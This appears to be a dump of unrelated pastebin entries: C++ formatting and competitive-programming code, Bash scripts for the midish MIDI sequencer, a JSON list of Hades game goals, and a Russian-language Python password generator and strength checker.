				}
				else if constexpr(is_same<t0, s_v3>) {
					builder->add(""{%f, %f, %f}"", val.x, val.y, val.z);
				}
				else if constexpr(is_same<t0, s_v4>) {
					builder->add(""{%f, %f, %f, %f}"", val.x, val.y, val.z, val.w);
				}
				else if constexpr(is_same<t0, s_v2i>) {
					builder->add(""{%i, %i}"", val.x, val.y);
				}
				else if constexpr(is_same<t0, s_token>) {
					builder->add(""%.*s"", val.str.count, val.str.str);
				}
				else {
					static_assert(!""Parameter type not handled"");
				}

				s_len_str temp_format = str_advance(format, i + 2);
				if(temp_format.count > 0) {
					format_text2_(builder, temp_format, args...);
				}
				return;
			}
		}

		builder->add_char(c);
	}
	#undef get_next_char
}

template <typename... targs>
func s_len_str format_text2(char* format, targs... args)
{
	s_len_str result = format_text2_with_arena(&g_string_arena, format, args...);
	return result;
}

template <typename... targs>
func s_len_str format_text2_with_arena(s_lin_arena* arena, char* format, targs... args)
{
	la_push(arena);
	typedef s_str_builder<16384> temp;
	temp* builder = (temp*)la_get(arena, sizeof(temp));
	builder->count = 0;
	builder->current_pad = 0;
	builder->num_tabs = 0;
	format_text2_(builder, S(format), args...);
	la_pop(arena);
	(void)la_get(arena, sizeof(s_str_builder<1>) + builder->count);
	s_len_str result = builder->to_len_str_alloc(arena);
	return result;
}

template <typename... targs>
func void printf2(char* format, targs... args)
{
	s_len_str str = format_text2(format, args...);
	printf(""%.*s"", expand_str(str));
}
"
8H1ZX1Yj,Uddered but not herd,tepyotin2,C++,Sunday 6th of July 2025 12:17:21 PM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>

using namespace std;

const int INF = 1e9;

void solve() {
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);

    string heard_string;
    cin >> heard_string;

    map<char, int> char_to_index;
    int unique_char_count = 0;
    for (char c : heard_string) {
        if (char_to_index.find(c) == char_to_index.end()) {
            char_to_index[c] = unique_char_count++;
        }
    }

    const int N = unique_char_count;
    if (heard_string.empty()) {
        cout << 0 << ""\n"";
        return;
    }
    if (N <= 1) {
        cout << 1 << ""\n"";
        return;
    }

    vector<vector<int>> adjacency_counts(N, vector<int>(N, 0));
    for (size_t i = 0; i + 1 < heard_string.length(); ++i) {
        int u = char_to_index[heard_string[i]];
        int v = char_to_index[heard_string[i+1]];
        adjacency_counts[u][v]++;
    }

    vector<int> min_hums(1 << N, INF);
    min_hums[0] = 1;

    const int low_bits_count = N / 2;
    const int high_bits_count = N - low_bits_count;
    const int low_bits_mask = (1 << low_bits_count) - 1;

    vector<vector<int>> precomputed_sums_low(N, vector<int>(1 << low_bits_count, 0));
    vector<vector<int>> precomputed_sums_high(N, vector<int>(1 << high_bits_count, 0));

    for (int j = 0; j < N; ++j) {
        for (int mask = 1; mask < (1 << low_bits_count); ++mask) {
            int lsb_idx = __builtin_ctz(mask); // right most bit e.g. 10010 -> 00010
            int prev_mask = mask ^ (1 << lsb_idx);
            precomputed_sums_low[j][mask] = precomputed_sums_low[j][prev_mask] + adjacency_counts[j][lsb_idx];
        }
        for (int mask = 1; mask < (1 << high_bits_count); ++mask) {
            int lsb_idx = __builtin_ctz(mask); // right most bit e.g. 10010 -> 00010
            int prev_mask = mask ^ (1 << lsb_idx);
            precomputed_sums_high[j][mask] = precomputed_sums_high[j][prev_mask] + adjacency_counts[j][low_bits_count + lsb_idx];
        }
    }

    for (int mask = 1; mask < (1 << N); ++mask) {
        for (int j = 0; j < N; ++j) {
            if (mask & (1 << j)) {
                int prev_mask = mask ^ (1 << j);

                int current_total_cost = min_hums[prev_mask];

                int cost_of_adding_j = 0;
                int high_mask_part = mask >> low_bits_count;
                cost_of_adding_j += precomputed_sums_low[j][mask & low_bits_mask];
                cost_of_adding_j += precomputed_sums_high[j][high_mask_part];

                current_total_cost += cost_of_adding_j;

                min_hums[mask] = min(min_hums[mask], current_total_cost);
            }
        }
    }

    cout << min_hums[(1 << N) - 1] << ""\n"";
}

int main() {
    solve();
    return 0;
}
"
Ls3BUDYi,Team Building,tepyotin2,C++,Sunday 6th of July 2025 12:16:13 PM CDT,"#include <iostream>
#include <vector>
#include <algorithm>

using namespace std;

struct Person {
    int id;
    long long audience_strength;
    vector<long long> player_strengths;
};

bool comparePeople(const Person& a, const Person& b) {
    return a.audience_strength > b.audience_strength;
}

int main() {
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);

    int n, p, k;
    cin >> n >> p >> k;

    vector<Person> people(n);
    for (int i = 0; i < n; ++i) {
        people[i].id = i;
        cin >> people[i].audience_strength;
    }

    for (int i = 0; i < n; ++i) {
        people[i].player_strengths.resize(p);
        for (int j = 0; j < p; ++j) {
            cin >> people[i].player_strengths[j];
        }
    }

    sort(people.begin(), people.end(), comparePeople);

    vector<vector<long long>> dp(n + 1, vector<long long>(1 << p, -1));

    dp[0][0] = 0;

    for (int i = 1; i <= n; ++i) {
        for (int mask = 0; mask < (1 << p); ++mask) {
            // the number of players
            int num_players_in_mask = 0;
            for(int j=0; j<p; ++j){
                if((mask >> j) & 1){
                    num_players_in_mask++;
                }
            }

            // what if people i-1 is audience
            long long non_player_strength = -1;
            if (dp[i - 1][mask] != -1) {
                int audience_candidates = i - num_players_in_mask;
                non_player_strength = dp[i - 1][mask];

                if (audience_candidates <= k)
                    non_player_strength = dp[i - 1][mask] + people[i - 1].audience_strength;
            }
            dp[i][mask] = non_player_strength;

            // what if people i-1 is player
            for (int j = 0; j < p; ++j) {
                if ((mask >> j) & 1) {
                    int prev_mask = mask ^ (1 << j);
                    if (dp[i - 1][prev_mask] != -1) {
                        long long player_strength = dp[i - 1][prev_mask] + people[i - 1].player_strengths[j];
                        dp[i][mask] = max(dp[i][mask], player_strength);
                    }
                }
            }
        }
    }

    cout << dp[n][(1 << p) - 1] << endl;

    return 0;
}
"
Q1xS8Ep8,midishcreaterc.sh,Meneer_Jansen,Bash,Sunday 6th of July 2025 12:01:12 PM CDT,"#!/bin/bash

# Script to ad a Midi device to the RC file of midish. Download from:
#    https://pastebin.com/edit/Q1xS8Ep8
# Variables:
#    $homedir        Home directory.
#    $rcfile         RC file for midish.
#    $port           Port Number of Midi device to be added.
#    $clientname     Client Name of Midi device to be added.
#    $maxdevice      Highest dnew number.
#    $linenum        Line number with $maxdevice.
#    $lineinput      Line after which to insert Midi input device.
#    $lineoutput     Line after which to insert Midi output device.
# Arrays:
#    dnewarray[]     Array with dnew numbers.
# Files:
#    tempaseqdump    Tempfile with aseqdump output.
# To do:
#    - make the script 48 cols wide for use on the Pi screen


homedir=/home/$USER
rcfile=$homedir/.midishrc
# Quit this script, remove it from backgroud and return to main menu
trap ""killall $(basename $0); midishscript.sh"" EXIT


# List currenty connected Midi devices and choose one.
printf ""Choose client number of Midi device to add to midish's RC file:\n\n""
# Use sed to print only first 40 characters
aseqdump -l | sed 's/.//40g'
aseqdump -l > tempaseqdump
echo
 
read -p ""Choice: "" port


# Determine Client Name
# ---------------------
# Select line containing $port
clientname=$(awk '/'$port'/' tempaseqdump)
printf ""$clientname"" > tempaseqdump
#printf ""    Debug: client name is: $clientname.\n""
# Use awk to select column 2 (= Client Name) and sed to remove trailing spaces.
# Define field widths for awk as 9, 33 and 41:
# see: https://stackoverflow.com/questions/26842477/awk-to-use-multiple-spaces-as-delimiter
# Use sed to remove trailing spaces.
# If the client name is in there twice (e.g. Korg Monologue) because the client has two ports - one for input and one for output - then remove 2nd line and the carriage return. Use: sed '2d'.
clientname=$(awk -v FIELDWIDTHS=""9 33 41"" '{print $2}' tempaseqdump | sed 's/[ ]*$//' | sed '2d')



# Determine max device number
# ---------------------------
# Match line that (starts) with ""dnew""; print column/field 2
dnewarray=( $(awk '{if ($1 == ""dnew"") print $2}' $rcfile) )
maxdevice=0
for x in ${dnewarray[@]}; do
   if (( $x > $maxdevice ))
      then maxdevice=$x
   fi 
done



# Insert the correct $clientname line into midishrc after $maxdevice number.
# Use awk to determine number of line/record starting with ""dnew $maxdevice"".
# Use sed to insert a new line after the one starting with ""dnew $maxdevice"".
linenum=$(awk '/^dnew '$maxdevice'/ {print NR}' $rcfile)
sed -i ""$((linenum + 1))i dnew $((maxdevice + 1)) \""${clientname}\""  rw"" $rcfile


# Add $clientname as i or o to midishrc
# -------------------------------------
# Replace spaces by undersores in client name:
clientname=""${clientname// /_}""
# Look for the remark line starting with ""# Inputs"", if not create it. And determine its line number. Finally insert stuff.
lineinput=$(awk '/^# Inputs/ {print NR}' $rcfile)
if [[ -z $lineinput ]]
   then
   sed -i ""$((linenum + 3))i # Inputs"" $rcfile
fi
sed -i ""$((lineinput + 1))i inew $clientname {$((maxdevice + 1)) 0}"" $rcfile
# Do the same for output
lineoutput=$(awk '/^# Outputs/ {print NR}' $rcfile)
if [[ -z $lineoutput ]]
   then
   sed -i ""$((linenum + 6))i # Outputs"" $rcfile
fi
sed -i ""$((lineoutput + 1))i onew $clientname {$((maxdevice + 1)) 0}"" $rcfile



# Cleanup & exit
rm tempaseqdump
clear
printf ""Done. Your RC file is: 
\e[34m%s\e[0m
I created for the Midi client named:
\e[34m%s\e[0m
a 'dnew' device number:
\e[34m%d\e[0m
which is now defined as Midi input and output on Midi channel 0. You can check this in midish with the command: \""ilist; olist\"".\n"" $rcfile $clientname $((maxdevice +1)) "
pD6cfDWH,Hades Lockout Test,i_need_a_nap,JSON,Sunday 6th of July 2025 11:59:33 AM CDT,"[{""name"": ""Duo Boon""},{""name"": ""Legendary Boon""},{""name"": ""Meg Defeated""},{""name"": ""Lernie Defeated""},{""name"": ""Champions Defeated""},{""name"": ""Hades Defeated""},{""name"": ""Have 500 Darkness""},{""name"": ""4 Weapons Unlocked""},{""name"": ""5 Keepsakes""},{""name"": ""Win Thanatos Encounter""},{""name"": ""Meet Sisyphus""},{""name"": ""Meet Euridyce ""},{""name"": ""Meet Patroclus""},{""name"": ""Complete 3 Paths in Styx""},{""name"": ""Get 250 Health""},{""name"": ""Get Death Defiance""},{""name"": ""Clear Tartarus in 5 minutes (Game timer)""},{""name"": ""Encounter Asterius as a Miniboss""},{""name"": ""Replace a boon with a different god's boon""},{""name"": ""Get 2 Hermes Boons (in one run)""},{""name"": ""Get 2 Hammers (in one run)""},{""name"": ""Buy an Anvil""},{""name"": ""Kill the Tiny Vermin""},{""name"": ""2 Chaos Boons""},{""name"": ""Game Over to Poison""}]"
XNRCMZRx,Основы Python. Проект №1,Brusnik,Python,Sunday 6th of July 2025 11:30:38 AM CDT,"import random as rd


def output_info_problems(problems):
    problems_set = set(problems)

    if 'lower_letter_flag' in problems_set:
        print('----- Отсутствуют строчные латинские буквы -----')
        print('<<<<< Можете добавить 1 или более символов из этого списка: [ a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z ] >>>>>\n')

    if 'capital_letter_flag' in problems_set:
        print('----- Отсутствуют заглавные латинские буквы -----')
        print('<<<<< Можете добавить 1 или более символов из этого списка: [ A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z ] >>>>>\n')

    if 'digit_flag' in problems_set:
        print('----- Отсутствуют цифры -----')
        print('<<<<< Можете добавить 1 или более символов из этого списка: [ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 ] >>>>>\n')

    if 'special_sym_flag' in problems_set:
        print('----- Отсутствуют специальные символы -----')
        print('<<<<< Можете добавить 1 или более символов из этого списка: [ !, @, #, $, %, ^, &, *, (, ), -, + ] >>>>>\n')

    if 'length_flag' in problems_set:
        print('----- Длина пароля менее восьми символов -----')


def input_info():
    valid_chars = set('!@#$%^&*()-+0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')

    length = int(input(""Введите длину будущего пароля: ""))
    while length < 1:
        print(""Длина пароля должна быть положительным целым числом!"")
        length = int(input(""Введите длину будущего пароля: ""))

    string_sym = input(""Введите все символы для пароля (без пробелов): "")
    set_sym = set(string_sym)
    while not all(ch in valid_chars for ch in set_sym):
        print(""Введенная последовательность содержит недопустимые символы!"")
        string_sym = input(""Введите все символы для пароля (без пробелов): "")
        set_sym = set(string_sym)

    return length, list(set_sym)



def output_info(evaluation, problems, password):
    print()
    if evaluation == 'reliable':
        print('Ваш пароль:', password)
        print('Этот пароль считается НАДЁЖНЫМ, никаких проблем не обнаружено!')
        return False

    elif evaluation == 'average':
        print('Ваш пароль:', password, '\n')
        print('Этот пароль считается СРЕДНИМ, поскольку содержит некоторые недостатки...')
        print('Проблемы данного пароля:')
        output_info_problems(problems)

    else:
        print('Ваш пароль:', password, '\n')
        print('Этот пароль считается НЕНАДЁЖНЫМ и не рекомендуется к использованию, поскольку содержит много недостатков...')
        print('Проблемы данного пароля:')
        output_info_problems(problems)

    print(""Желаете создать новый пароль?"")
    answer = input(""Да/Нет: "")
    return answer.lower() == 'да' or answer.lower() == 'y' or answer.lower() == 'yes'



def generate_password(length, syms):
    spec_sign_set = set(""!@#$%^&*()-+"")
    digit_set = set(""0123456789"")
    lower_letter_set = set(""abcdefghijklmnopqrstuvwxyz"")
    capital_letter_set = set(""ABCDEFGHIJKLMNOPQRSTUVWXYZ"")

    available = {
        ""special_sign"": [ch for ch in syms if ch in spec_sign_set],
        ""digit"": [ch for ch in syms if ch in digit_set],
        ""lower_letter"": [ch for ch in syms if ch in lower_letter_set],
        ""capital_letter"": [ch for ch in syms if ch in capital_letter_set],
    }

    required_chars = []
    for group in available.values():
        if group:
            required_chars.append(rd.choice(group))

    if length < len(required_chars):
        full_password_list = rd.sample(required_chars, k=length)
    else:
        remaining_length = length - len(required_chars)
        remaining_chars = rd.choices(syms, k=remaining_length)

        full_password_list = required_chars + remaining_chars
        rd.shuffle(full_password_list)

    return ''.join(full_password_list)


def evaluation_password(password, length):
    dict_flags = {'lower_letter_flag': False, 'capital_letter_flag': False, 'digit_flag': False, 'special_sym_flag': False, 'length_flag': False}

    spec_sign_set = set(""!@#$%^&*()-+"")
    digit_set = set(""0123456789"")
    lower_letter_set = set(""abcdefghijklmnopqrstuvwxyz"")
    capital_letter_set = set(""ABCDEFGHIJKLMNOPQRSTUVWXYZ"")

    if length >= 8:
        dict_flags['length_flag'] = True

    if any(ch in spec_sign_set for ch in password):
        dict_flags['special_sym_flag'] = True

    if any(ch in lower_letter_set for ch in password):
        dict_flags['lower_letter_flag'] = True

    if any(ch in capital_letter_set for ch in password):
        dict_flags['capital_letter_flag'] = True

    if any(ch in digit_set for ch in password):
        dict_flags['digit_flag'] = True

    sum_flags = sum([int(i) for i in dict_flags.values()])

    problems = [i[0] for i in dict_flags.items() if i[1] == False]

    if sum_flags == 5:
        return 'reliable', []
    elif sum_flags >= 3:
        return 'average', problems
    else:
        return 'weak', problems


def main():
    print(""Здравствуйте! Вас приветствует программа для генерации надёжного пароля!\n"")

    repeat_flag = True

    while repeat_flag:
        length, syms = input_info()

        password = generate_password(length, syms)

        evaluation, problems = evaluation_password(password, length)

        repeat_flag = output_info(evaluation, problems, password)



main()"
2d3ju4if,Проект №1,Brusnik,Python,Sunday 6th of July 2025 11:24:48 AM CDT,"import random as rd
from zoneinfo import available_timezones


def output_info_problems(problems):
    problems_set = set(problems)

    if 'lower_letter_flag' in problems_set:
        print('----- Отсутствуют строчные латинские буквы -----')
        print('<<<<< Можете добавить 1 или более символов из этого списка: [ a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z ] >>>>>\n')

    if 'capital_letter_flag' in problems_set:
        print('----- Отсутствуют заглавные латинские буквы -----')
        print('<<<<< Можете добавить 1 или более символов из этого списка: [ A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z ] >>>>>\n')

    if 'digit_flag' in problems_set:
        print('----- Отсутствуют цифры -----')
        print('<<<<< Можете добавить 1 или более символов из этого списка: [ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 ] >>>>>\n')

    if 'special_sym_flag' in problems_set:
        print('----- Отсутствуют специальные символы -----')
        print('<<<<< Можете добавить 1 или более символов из этого списка: [ !, @, #, $, %, ^, &, *, (, ), -, + ] >>>>>\n')

    if 'length_flag' in problems_set:
        print('----- Длина пароля менее восьми символов -----')


def input_info():
    valid_chars = set('!@#$%^&*()-+0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')

    length = int(input(""Введите длину будущего пароля: ""))
    while length < 1:
        print(""Длина пароля должна быть положительным целым числом!"")
        length = int(input(""Введите длину будущего пароля: ""))

    string_sym = input(""Введите все символы для пароля (без пробелов): "")
    set_sym = set(string_sym)
    while not all(ch in valid_chars for ch in set_sym):
        print(""Введенная последовательность содержит недопустимые символы!"")
        string_sym = input(""Введите все символы для пароля (без пробелов): "")
        set_sym = set(string_sym)

    return length, list(set_sym)



def output_info(evaluation, problems, password):
    print()
    if evaluation == 'reliable':
        print('Ваш пароль:', password)
        print('Этот пароль считается НАДЁЖНЫМ, никаких проблем не обнаружено!')
        return False

    elif evaluation == 'average':
        print('Ваш пароль:', password, '\n')
        print('Этот пароль считается СРЕДНИМ, поскольку содержит некоторые недостатки...')
        print('Проблемы данного пароля:')
        output_info_problems(problems)

    else:
        print('Ваш пароль:', password, '\n')
        print('Этот пароль считается НЕНАДЁЖНЫМ и не рекомендуется к использованию, поскольку содержит много недостатков...')
        print('Проблемы данного пароля:')
        output_info_problems(problems)

    print(""Желаете создать новый пароль?"")
    answer = input(""Да/Нет: "")
    return answer.lower() == 'да' or answer.lower() == 'y' or answer.lower() == 'yes'



def generate_password(length, syms):
    spec_sign_set = set(""!@#$%^&*()-+"")
    digit_set = set(""0123456789"")
    lower_letter_set = set(""abcdefghijklmnopqrstuvwxyz"")
    capital_letter_set = set(""ABCDEFGHIJKLMNOPQRSTUVWXYZ"")

    available = {
        ""special_sign"": [ch for ch in syms if ch in spec_sign_set],
        ""digit"": [ch for ch in syms if ch in digit_set],
        ""lower_letter"": [ch for ch in syms if ch in lower_letter_set],
        ""capital_letter"": [ch for ch in syms if ch in capital_letter_set],
    }

    required_chars = []
    for group in available.values():
        if group:
            required_chars.append(rd.choice(group))

    if length < len(required_chars):
        full_password_list = rd.sample(required_chars, k=length)
    else:
        remaining_length = length - len(required_chars)
        remaining_chars = rd.choices(syms, k=remaining_length)

        full_password_list = required_chars + remaining_chars
        rd.shuffle(full_password_list)

    return ''.join(full_password_list)


def evaluation_password(password, length):
    dict_flags = {'lower_letter_flag': False, 'capital_letter_flag': False, 'digit_flag': False, 'special_sym_flag': False, 'length_flag': False}

    spec_sign_set = set(""!@#$%^&*()-+"")
    digit_set = set(""0123456789"")
    lower_letter_set = set(""abcdefghijklmnopqrstuvwxyz"")
    capital_letter_set = set(""ABCDEFGHIJKLMNOPQRSTUVWXYZ"")

    if length >= 8:
        dict_flags['length_flag'] = True

    if any(ch in spec_sign_set for ch in password):
        dict_flags['special_sym_flag'] = True

    if any(ch in lower_letter_set for ch in password):
        dict_flags['lower_letter_flag'] = True

    if any(ch in capital_letter_set for ch in password):
        dict_flags['capital_letter_flag'] = True

    if any(ch in digit_set for ch in password):
        dict_flags['digit_flag'] = True

    sum_flags = sum([int(i) for i in dict_flags.values()])

    problems = [i[0] for i in dict_flags.items() if i[1] == False]

    if sum_flags == 5:
        return 'reliable', []
    elif sum_flags >= 3:
        return 'average', problems
    else:
        return 'weak', problems


def main():
    print(""Здравствуйте! Вас приветствует программа для генерации надёжного пароля!\n"")

    repeat_flag = True

    while repeat_flag:
        length, syms = input_info()

        password = generate_password(length, syms)

        evaluation, problems = evaluation_password(password, length)

        repeat_flag = output_info(evaluation, problems, password)



main()"
rRvH5inb,midishscript.sh,Meneer_Jansen,Bash,Sunday 6th of July 2025 11:11:51 AM CDT,"#!/bin/bash

# midishcscript.sh
# Download this script from: pastebin.com/rRvH5inb
#
# This script lets you program sequences to play with 'midish'. That sequence is saved in a file called ""midishtemp"" Download midish from:
#
#    https://midish.org
#
# Files/scripts this script also needs
# ====================================
# - midishsong.sh    : song/project script for midish
# - midishchord.sh   : chord script
# - midishcreaterc.sh: add devices to .midishrc
#
# This script REQUIRES!:
# ======================
# - 'Extra RC' for midish by Jeanette C. from:
#   http://juliencoder.de/test/index.php?page=software/index 
# - My personal 'midishrc' file because it has additional midish procedures, 
#   download from: 
#   https://pastebin.com/NcQ3aMaA
#   (deleted due to ""abuse reports"" and ""deemed potentially harmful""!!!???, 
#   see e-mail 14-9-'24)
#
# Function list
# =============
# menu           : Main  menu
# help_me        : Help  menu
# other          : Other menu
# song           : Song  menu
# chord          : Chord menu
# list_devices   : Print in- & output devces
# single_note    : Input single note-number via Midi keyboard
# midish_play    : Play a sequence in midish
# noteinput      : Create 16 step sequence (into ""midishtemp"" file)
# convertnotes   : Convert Midi note-numbers to musical notes or edit them
# connect        : Connect Midi input to output for midish
# play           : Play a synth via midish
# seqplay        : Play a sequence once or in a loop in midish
# kill_midish    : Kill midish processes in the background
# tempo          : Set tempo in BPM
# metronome      : Set metronome on/off
# chord          : Go to chord script
# 
# Files this script creates
# =========================
# - midishtemp   : temp/work file with 16 Midi note numbers
# 
# To do
# =====
# - Function 'Tempo': make external master clock device work in seq play 
#   and loop
# - Write the chord script (chord procedure is already added in .midishrc?)
# - Metronome menu/function.
# - Make exiting play and loop easier.



# Return to Main Menu when pressed Ctrl C
trap ""midishscript.sh"" 2

# Check if tempo is set, if not set it to 100 BPM
if [[ -z $tempo ]]; then
   tempo='100'
   # Save variable for other script 
   export tempo
fi

# Check if Master clock device is set, if not set it to nil
if [[ -z $masterdevice ]]; then
   masterdevice='nil'
fi



#######################
#  M A I N   M E N U  #
#######################
function menu()
{
   # This function prints the Main menu
   # Reset trap
   trap ""exit"" 2
   clear              #123456789012345678901234567890123456789012345678#
  #echo -e ""\e[37;44;1m――――――――――――◆  M A I N   M E N U  ◆―――――――――――――\e[m""
  #echo -e ""\e[37;44;1m :: :: :: ::   M A I N   M E N U   :: :: :: ::  \e[m""
   echo -e ""\e[37;44;1m               M A I N   M E N U                \e[m""
   echo -e ""\e[1mSequence   \e[0m1. Enter sequence of 16 notes/steps""
   echo              ""           2. [E]dit/show notes""
   echo              ""           3. Load & save [S]equence menu""
   echo
   echo -e ""\e[1mPlayback   \e[0m4. [C]onnect in- and output""
   echo              ""           5. [I]nteractively play synth""
   echo              ""           6. [P]lay or [L]oop sequence""
   echo
   echo -e ""\e[1mSongs      \e[m7. [S]ong menu""
   echo
   echo -e ""\e[1mMisc.      \e[0;34m[O] Other menu (tempo, etc.)\e[m""
   echo -e        ""           \e[32m[H] Help\e[m""
   echo -e        ""           \e[31m[X] Exit\e[m""
   echo -e -n ""\n\e[34;1mChoice (Enter to go back to prev. menu/state): \e[0m""; read -N 1 i; echo
   case $i in
      1    ) noteinput;;
      c|4  ) connect;;
      e|2  ) convertnotes;;
      h    ) help_me;;
      i|5  ) play;;
      l|p|6) seqplay;;
      o    ) other;;
      s|3|7) midishsong.sh;;
      x    ) echo; exit
   esac
}



######################################
#  G E N E R A L  F U N C T I O N S  #
#####################################
function list_devices()
{
   # This function prints in- or outdevices on screen. It is called from/meant to be used in connect().
   #
   # This function NEEDS the following variables to be set:
   #    $devicetype: by the function connect(): inew or onew in- or output
   #                 device type from .midishrc
   #
   # This function sets these varaibles:
   #    $max       : max amount of in- or output devices
   #    $element   : element in array
   #
   # Arrays used:
   #    array[]    : array of device names

   # Put elements in an array for awk
   max=$(cat  ~/.midishrc | grep -Ec ""$devicetype"")
   array=(); array[0]=""bogusvalue"" # We can now start counting at 1 instead of 0

   # Print numbers and in- or ouput devices to choose from and build array of devices
   for (( n=1; n<=$max; n++ ))
   do
      element=$(cat  ~/.midishrc | grep ""$devicetype"" | \
      awk 'NR=='$n' {print $2}')
      printf ""%3s %s\n"" $n $element
      array+=(""$element"")
   done
}


function connect()
{
   # This function connects input to output. 
   #
   # This function NEEDS the function(s):
   #    list_devices: to print in- or output devices on screen
   #
   # This function uses the following array from 'list_devices':
   #    array[]     : array of device names
   #
   # This function sets the variables:
   #    $input      : name of input device in .midishrc
   #    $output     : name of output device in .midishrc

   clear

   # Choose input device
   devicetype='inew'      # used/needed in list_devices()
   list_devices           # internal function
   # The array ""array"" from 'list_devices' is used here:
   read -N2 -p ""Choose input dev (e.g. keyboard) nr.: "" input
   # Convert $input to element from array
   echo ""(${array[$input]})""
   input=${array[$input]}

   # Choose output device
   devicetype='onew'
   list_devices 
   read -N2 -p ""Choose output dev (e.g. synth) nr.: "" output
   echo ""(${array[$output]})""
   output=${array[$output]}

   # Save variables for other script 
   export input output
   echo -e ""\e[34;1mPress enter to return to Menu\e[0m""; read

   # Loop
   menu
}


function single_note()
{
   # This function returns a single Midi note-number input by Midi-keybd.
   #
   # This function is called by the functions:
   #    noteinput()    : enter a seq of 16 notes
   #    convertnotes() : convert Midi note-numbers to musical notes
   #
   # This function NEEDS the following variable(s) to be set:
   #    $portnumber: created by function noteinput()

   # Check portnumbers with: 'aseqdump -l'
   aseqdump -p $portnumber | sed \
   -e 's/ '$portnumber':0   Note on                 0, note //'         \
   -e 's/, velocity .*$//'                                              \
   -e '/Note off/d; /Waiting/d; /Source/d; /Polyphonic aftertouch/d'    \
   -e 's/ '$portnumber':0   Control change          0, controller 1, value 127/s /' \
   -e '/ '$portnumber':0   Control change          0, controller 1, value .*$/d'   \
   -e 's/ '$portnumber':0   Pitch bend              0, value -8192/ll/' \
   -e '/ '$portnumber':0   Pitch bend              0, value -.*$/d'     \
   -e 's/ '$portnumber':0   Pitch bend              0, value 8191/l /'  \
   -e '/ '$portnumber':0   Pitch bend              0, value .*$/d'      \
   -e 'q'                                                               \
   | sed -z 's/\n/ /'
}


function noteinput()
{
   # This function will let you enter a sequence of 16 notes. The numbers: will be saved in the file 'midishtemp'. Opposed to the procedure in my personal ~/.midishc file it does not need the two 's' entries after an 'll'. (note: a 'l' long note doesn't need a [s]ilence at all)
   #
   # This function creates the file(s):
   #    midishtemp    : file with the 16 midi note-numbers
   #
   # This function needs the function(s):
   #    single_note   : returns a single Midi note-number to be saved
   #
   # This function sets the follown variables:
   #    $portnumber   : Midi port-number of keyboard to enter notes with
   #    $max          : number of notes
   #    $n            : counter to count the inputted notes (step)
   #    $m            : $n minus 1 to determine previous step
   #    $i            : counter to count to 2

   # Reset trap
   trap ""menu"" 2
 
   clear
   echo -e ""Determine your portnumber from output below:\n""
   # Use sed to remove anything after the 40th character
   aseqdump -l | sed 's/.//40g'
   echo -e ""\nInput portnumber and (re)enter your notes. Press Ctrl+C to return to the Menu if you're satisfied with the notes you've entered before.""
   read portnumber
 
   rm midishtemp
   max=16
   echo ""Steps/notes:""

   # Do for all the (16) steps
   for (( n=1; n<=$max; n++ ))
   do
      printf ""[%2s]"" $n;
      # Use the function single_note
      single_note | \
      tee -a midishtemp
      # Concatenate/remove line ending
      sed -i -z 's/\n/ /g' midishtemp
      # If note = ll, Then the next step is simply the note input. 
      # If (step - 2) was ll then the next 2 entries are 's' (= skip) 
      # and continue for n=n+2.
      m=$(($n-1))   # m is previous step
      if  [[ $m -gt 0 ]]
         then
         if [[ $(echo ""$(awk '{print $'$m'}' midishtemp)"") == 'll' ]]
            then
            echo -n ""s  s  ""  >> midishtemp
            # Print two times on screen the step and [s]ilence
            for (( i=1; i<=2; i++ ))
            do
               # If multple of 4 then new line
               if (( $n % 4 == 0 )); 
                  then echo 
               fi
               let n++   # you can't use ""just"" use n++ in Bash
               printf ""[%2s]"" $n; printf ""s  ""
            done
         fi
      fi
      # If multple of 4 then new line:
      if (( $n % 4 == 0 )); 
         then echo
      fi
   done
 
   # Loop
   echo -e ""\n\e[34;1mPress enter to return to Menu\e[0m""; read bogusvalue
   menu
}


function kill_midish()
{
   killall midish
   echo -e ""\e[34;1mPress enter to return to Menu\e[0m""; read bogusvalue
   other
}


#######################
#  S E Q U E N S E S  #
####################### 
function convertnotes()
{
   # This function converts Midi note-numbers from ""midishtemp"""" to musical notes (to print then in human readable on screen) and offers to edit them or show the Midi note-numbers.
   #
   # This function uses the array(s):
   #    notes         : array containing notes, used to convert note-numbers
   #
   # This function needs the file(s):
   #    midishtemp    : contains the Midi note-numbers, made by noteinput().
   #    midishtemptemp: awk can't do in-line editing (like sed can)
   #
   # This function sets the variable(s):
   #    $max          : number of enries in 'midishtemp'
   #    $n            : counter for the entries in 'midishtemp'
   #    $entry        : entry number $n in 'midishtemp'
   #    $answer       : edit note or not?
   #    $portnumber   : portnumber set in noteinput()
   #    $step         : step in 'midishtemp' to change
   #    $note         : input note by Midi keybd (by noteinput()) 
   #
   # This function calls the function(s):
   #    single_note   : input a single not with a Midi-keyboard
   #    which depends on:
   #    noteinput()   : create 16 step sequence and set $portnumber
   #
   # To do:
   #    - Get rid of the dirty workaround with -v $note in the awk command.


   # Below is an array with all music notes. Example: entry 47 is note C3, etc.:
   #      000 001 002 003 004 005 006 007 008 009 010 011 012 013 014 015 016 017 018 019 020 021 022 023 024 025 026 027 028 029 030 031 032 033 034 035 036 037 038 039 040 041 042 043 044 045 046 047 048 049 050 051 052 053 054 055 056 057 058 059 060 061 062 063 064 065 066 067 068 069 070 071 072 073 074 075 076 077 078 079 080 081 082 083 084 085 086 087 088 089 090 091 092 093 094 095 096 097 098 099 100 101 102 103 104 104 106 107 108 109 110 111 112 113 114 115 116 117 118 119
